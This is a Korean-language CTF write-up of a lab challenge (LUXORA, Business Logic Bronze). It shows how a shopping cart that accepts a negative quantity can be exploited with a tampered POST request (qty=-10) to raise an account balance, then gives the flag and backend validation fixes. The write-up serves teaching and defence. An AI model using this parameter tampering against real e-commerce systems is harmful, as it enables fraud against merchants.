+++
title = "VulnABLE CTF [LUXORA] Write-up: Business Logic 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Business Logic", "Bronze", "Negative Quantity", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Business Logic 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Logic & Business Layer (Business Logic Flaw)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/logic/bronze`
- **목표**: 장바구니(Cart)에 상품을 담을 때, 시스템이 수량(Quantity)에 대해 '음수(-)'를 필터링하지 않는 비즈니스 로직 결함을 악용하여 총 결제 금액을 마이너스로 만들고 계좌 잔고를 비정상적으로 늘려라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/logic/bronze` 페이지는 전형적인 이커머스 장바구니 인터페이스입니다.
현재 내 계정의 초기 잔액(Balance)은 **100 포인트** 입니다.

**[정상 구매 테스트]**
- 상품 A (가격 50 포인트)
- 수량(Quantity) 필드에 `1` 입력 후 [Add to Cart] 클릭
- 장바구니 총액: 50 포인트
- [Checkout] 클릭 시 잔액이 100 ➔ 50으로 줄어들며 구매 성공.

**[해커의 사고 과정]**
1. 총액 계산 공식은 아마 `상품 가격(50) * 수량(qty)` 일 것이다.
2. 만약 내가 수량 필드에 `-10` 을 입력한다면 어떻게 될까?
3. 총액은 `50 * -10 = -500` 이 될 것이다.
4. 결제(Checkout)를 할 때, 서버는 내 잔액에서 총액을 "뺀다". 즉, `내 잔액(100) - 총액(-500)` 이 되어 오히려 내 잔액이 600 포인트로 늘어나지 않을까?!

---

## 💥 2. 취약점 식별 및 데이터 조작 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Buy -10 Items)--> [ Web Server ]
                                  |-- Total = -500
                                  |-- Balance = Balance - (-500)
                                  |-- Balance Increased!
```


이 취약점은 프로그래밍 언어나 프레임워크의 버그가 아니라, 순수하게 개발자의 "설마 사람이 수량에 마이너스를 넣겠어?"라는 안일한 가정(Logic Flaw)에서 비롯됩니다.

### 💡 파라미터 변조 (Parameter Tampering)
장바구니 추가 폼의 수량 입력칸(input type="number")은 프론트엔드에서 음수 입력을 막아두었을 수 있습니다. (예: `min="1"`) 
따라서 Burp Suite를 이용해 백엔드로 전송되는 HTTP 요청을 직접 조작합니다.

**[조작된 장바구니 추가 요청]**
```http
POST /logic/bronze/cart HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session=hacker_session

item_id=1&qty=-10
```

---

## 🚀 3. 공격 수행 및 계좌 잔고 확인

### 🔍 서버의 반응 (장바구니 확인)
서버는 `-10` 이라는 수량을 받아들여 장바구니에 담습니다.

```html
<div class="cart">
  <p>Item: Premium Laptop</p>
  <p>Price: $50</p>
  <p>Quantity: -10</p>
  <h3>Total: $-500</h3>
</div>
```

### 결제(Checkout) 수행
장바구니 총액이 `-500` 인 상태로 [Checkout] 버튼을 누릅니다.

**[서버 내부 계산 로직]**
```javascript
let newBalance = user.balance - cart.total;
// 100 - (-500) = 600
user.balance = newBalance;
```

### 🔍 조작된 서버의 응답
결제가 "성공" 처리되며, 내 계좌로 500포인트가 비정상적으로 환불(환수)되어 잔액이 늘어납니다!

```text
[!] System: Negative total checkout detected. Balance manipulated.
FLAG: FLAG{LOGIC_🥉_NEGATIVE_QTY_A1B2C3}
```

이 불어난 잔고를 이용해 다른 값비싼 플래그 상품을 자유롭게 구매할 수 있게 되었습니다.

---

## 🚩 4. 롸잇업 결론 및 플래그

애플리케이션의 비즈니스 규칙(수량은 항상 0보다 커야 한다)을 백엔드에서 강제하지 않았을 때, 사용자가 마이너스 연산을 통해 돈을 복사해 내는 전형적인 로직 결함 공격을 실증했습니다.

**🔥 획득한 플래그:**
`FLAG{LOGIC_🥉_NEGATIVE_QTY_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
프론트엔드 HTML(`min="1"`)의 제약조건은 해커에게 아무런 의미가 없습니다. 모든 비즈니스 데이터 검증은 백엔드에서 이루어져야 합니다.

* **안전한 패치 가이드 (백엔드 파라미터 검증)**
1. **절대적인 수량 검증**: 장바구니에 물건을 담는 API, 결제를 진행하는 API의 최상단에서 수량(Quantity) 데이터가 `정수(Integer)`인지, 그리고 `1 이상`인지 엄격하게 검증해야 합니다.
```javascript
// 안전한 Node.js 백엔드 로직 예시
const qty = parseInt(req.body.qty, 10);

if (isNaN(qty) || qty <= 0) {
    return res.status(400).send("Invalid quantity. Must be at least 1.");
}
```

2. **비정상 총액 방어**: 장바구니에 담긴 물건을 최종 결제할 때, 총 결제 금액(Total Amount)이 절대 0보다 작아질 수 없도록 이중 방어막(Safety Net)을 쳐야 합니다.
```javascript
if (cart.total <= 0) {
    return res.status(400).send("Checkout total cannot be zero or negative.");
}